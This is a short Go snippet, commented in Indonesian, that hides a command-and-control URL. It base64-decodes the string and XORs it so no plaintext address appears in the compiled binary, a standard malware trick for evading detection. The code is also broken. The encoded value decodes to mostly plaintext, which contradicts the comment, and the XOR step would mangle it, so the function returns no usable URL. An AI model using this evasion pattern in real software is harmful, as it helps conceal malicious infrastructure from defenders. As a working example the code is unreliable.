package main

import "encoding/base64"

// XOR runtime string — hindari plaintext di binary
var urlKey = byte(0x5A)

func unxor(b []byte, k byte) []byte {
    out := make([]byte, len(b))
    for i := range b { out[i] = b[i] ^ k }
    return out
}

// ter-encode base64 lalu XOR, tidak ada plaintext "https://"
var urlEncoded = "dUpzdHRwczovLzEyNy4wLjAuMTo4NDQz"

func c2URL() string {
    b, _ := base64.StdEncoding.DecodeString(urlEncoded)
    return string(unxor(b, urlKey))
}
